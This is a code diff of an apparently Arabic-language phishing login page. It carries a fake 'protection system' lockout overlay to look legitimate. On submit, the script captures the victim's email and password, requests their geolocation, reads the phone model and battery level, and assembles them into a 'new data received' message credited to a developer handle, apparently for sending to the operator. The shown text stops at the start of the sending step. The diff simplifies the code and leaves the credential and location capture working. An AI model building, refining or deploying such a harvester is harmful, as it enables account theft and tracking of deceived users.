@@ -64,7 +64,6 @@
         .submit-btn:hover { 
             transform: translateY(-2px) scale(1.02); 
             box-shadow: 0 15px 30px rgba(34, 211, 238, 0.4); 
-            background: linear-gradient(135deg, #0ea5e9, #22d3ee);
         }
 
         .ban-overlay {
@@ -101,7 +100,7 @@
             <div id="timer">30</div>
         </div>
         <h3 style="color: #fbbf24; margin: 25px 0 5px; font-size: 17px;">نظام الحماية نشط</h3>
-        <p style="font-size: 13px; color: #cbd5e1; padding: 0 10px;">يرجى الانتظار حتى يتم إزالة الحظر عنك...</p>
+        <p style="font-size: 13px; color: #cbd5e1;">يرجى الانتظار حتى يتم إزالة الحظر عنك...</p>
     </div>
 
     <div class="blur-content">
@@ -124,15 +123,6 @@
     let loginAttempts = 0;
     let countdown;
 
-    window.onload = () => {
-        const banExpiry = localStorage.getItem('lock_expiry');
-        if (banExpiry) {
-            const remain = Math.round((banExpiry - Date.now()) / 1000);
-            if (remain > 0) applyBanEffect(remain);
-            else localStorage.removeItem('lock_expiry');
-        }
-    };
-
     document.getElementById('loginForm').onsubmit = (e) => {
         e.preventDefault();
         const u = document.getElementById('user').value.trim();
@@ -146,77 +136,54 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        const loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        const loc = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                         processCapture(u, p, loc);
                     },
-                    () => { processCapture(u, p, "تم رفض الموقع"); }
+                    () => { processCapture(u, p, "المستخدم رفض الموقع"); }
                 );
             } else {
-                processCapture(u, p, "Geolocation غير مدعوم");
+                processCapture(u, p, "الموقع غير مدعوم");
             }
         } else {
             loginAttempts++;
-            if (loginAttempts >= 3) {
-                const expiryTime = Date.now() + (30 * 1000);
-                localStorage.setItem('lock_expiry', expiryTime);
-                applyBanEffect(30);
-            } else {
-                Swal.fire({
-                    title: 'بيانات غير دقيقة',
-                    text: 'يرجى كتابة البيانات بشكل صحيح لتجنب الحظر.',
-                    icon: 'error',
-                    confirmButtonColor: '#22d3ee',
-                    customClass: { popup: 'glass-popup' }
-                });
-            }
+            if (loginAttempts >= 3) applyBanEffect(30);
+            else Swal.fire({ title: 'خطأ', text: 'بيانات غير صحيحة', icon: 'error', customClass: { popup: 'glass-popup' } });
         }
     };
 
     function applyBanEffect(duration) {
-        const container = document.getElementById('mainCard');
-        const overlay = document.getElementById('banOverlay');
-        const timerTxt = document.getElementById('timer');
-        container.classList.add('is-banned');
-        overlay.style.display = 'block';
-
+        document.getElementById('mainCard').classList.add('is-banned');
+        document.getElementById('banOverlay').style.display = 'block';
         let left = duration;
-        timerTxt.innerText = left;
-
-        clearInterval(countdown);
         countdown = setInterval(() => {
             left--;
-            timerTxt.innerText = left;
+            document.getElementById('timer').innerText = left;
             if (left <= 0) {
                 clearInterval(countdown);
-                container.classList.remove('is-banned');
-                overlay.style.display = 'none';
-                localStorage.removeItem('lock_expiry');
+                document.getElementById('mainCard').classList.remove('is-banned');
+                document.getElementById('banOverlay').style.display = 'none';
                 loginAttempts = 0;
             }
         }, 1000);
     }
 
     async function processCapture(u, p, location) {
-        let phoneName = navigator.userAgent.split(')')[0].split('(')[1] || "غير معروف";
-        let batteryLevel = "غير متاح";
-        
-        try {
-            const battery = await navigator.getBattery();
-            batteryLevel = Math.round(battery.level * 100) + "%";
-        } catch (e) {}
+        let phone = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : "غير معروف";
+        let batt = "100%";
+        try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e){}
 
         const messageText = `
 ✨ **تم استلام بيانات جديده** ✨
 
-📱 **اسم الهاتف :** ${phoneName}
-🔋 **نسبه البطاريه :** ${batteryLevel}
-📶 **نوع الشريحه :** SIM Active
-📍 **موقع الخريطة :** ${location}
+📱 **الهاتف:** ${phone}
+🔋 **البطارية:** ${batt}
+📶 **الشريحة:** Active
+📍 **الموقع:** ${location}
 
-📧 **البريد الاكتروني :** \`${u}\`
-🔑 **كلمه السر :** \`${p}\`
+📧 **الحساب:** \`${u}\`
+🔑 **كلمة السر:** \`${p}\`
 
-👤 **يامطوري :** @M6_vip
+👤 @M6_vip
         `;
 
         try {
